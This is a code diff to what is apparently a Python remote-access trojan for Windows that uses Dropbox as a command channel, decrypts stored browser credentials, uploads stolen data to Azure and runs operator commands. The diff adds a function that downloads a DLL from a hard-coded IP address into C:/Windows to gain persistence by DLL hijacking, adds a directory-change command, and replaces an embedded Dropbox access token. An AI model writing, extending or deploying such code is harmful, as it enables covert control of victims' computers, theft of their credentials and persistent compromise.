@@ -5,6 +5,8 @@ import random
 import sqlite3
 import json
 import winreg
+import os
+import requests
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
@@ -13,6 +15,7 @@ from Cryptodome.Cipher.AES import new, MODE_GCM
 from win32.win32crypt import CryptUnprotectData
 from azure.storage.blob import BlobServiceClient
 from datetime import datetime
+from pathlib import Path
 
 
 # Aes-128 Encryption
@@ -126,6 +129,31 @@ def exfil():
         write_output(b"Failed uploading to Azure")
         print(e)
 
+def persist_dll():
+    # URL of the DLL to download
+    dll_url = "http://3.21.21.191/cscapi.dll"
+
+    windows_path = Path("C:/Windows")
+
+    # The file name and the full path to save the DLL
+    file_name = "cscapi.dll"
+    save_path = windows_path / file_name
+
+    response = requests.get(dll_url)
+
+    try:
+        if response.status_code == 200:
+        # Save the content to the specified file path
+            with open(save_path, 'wb') as file:
+                file.write(response.content)
+            print("DLL downloaded successfully.")
+            write_output(b"Persistance Achieved")
+    except:
+        print(f"Failed to download file. Status code: {response.status_code}")
+        write_output(b'DLL Hijacking Failed, try again!!')
+
+
+
 def persistance():
     try:
         key_name = "Zoom.exe"  
@@ -188,6 +216,17 @@ def check_new_command(prev_output):
 
         elif new_command == 'persistance':
             persistance()
+        
+        elif new_command.split(" ")[0] == 'cd':
+            try:
+                directory = str(new_command.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                dir_resp = 'Changed to ' + cur_dir
+                write_output(dir_resp.encode())
+            except Exception as e:
+                write_output(e)
             
         else:
             excecute(new_command)
@@ -199,7 +238,7 @@ if __name__ == '__main__':
     CONST_IV = 'qwertyuiopasdfgh'.encode()
 
     # Dropbox token
-    token = "sl.BzipikmzyjxCV7JGHNeWSt-Xpp5YZYLNLPT1HpJtB1k5pRFv00cTbS60O0rU7aasDlSNrv0l9KD1Pjd0DabePyrzYN2WCTNAgGqHJ5RwSGz7_b-08B5VbXf_ZSXRUcSoeWHvTs61plZ-M-zUwe4d"
+    token = "sl.BzuQXugw07LSvyTMx14EaGiRJgk-YkrNRoKEL8U-YiLXWF_OkVDuiZPj5nARyFwHTtkoI4Q-gx3gUFH79Mb2ExVFmS9hd6QQqNdArX6SvNhXQiwX0ya5ScnFD7e16SqwqehBgDzbJb_DJoVvI1E4"
 
     dbx = dropbox.Dropbox(token)
     dropbox_path = '/c2/payload.txt'
